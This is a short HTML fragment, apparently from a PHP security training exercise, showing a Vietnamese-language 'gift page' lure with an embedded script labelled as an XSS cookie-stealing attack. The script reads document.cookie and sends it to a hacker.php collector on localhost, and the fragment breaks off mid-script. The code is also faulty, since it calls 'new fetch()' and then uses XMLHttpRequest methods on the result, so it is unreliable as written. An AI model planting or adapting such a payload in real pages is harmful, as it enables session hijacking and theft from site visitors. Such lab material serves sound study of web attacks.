<body>
    <h1>Chào mừng đến trang quà tặng!</h1>
    <script>
        // Tấn công XSS đánh cắp cookie
        var stolenCookie = document.cookie;
        var xhr = new fetch();
        xhr.open('GET', 'http://localhost/11-training-php/hacker.php?cookie=' + encodeURIComponent(stolenCookie), true);
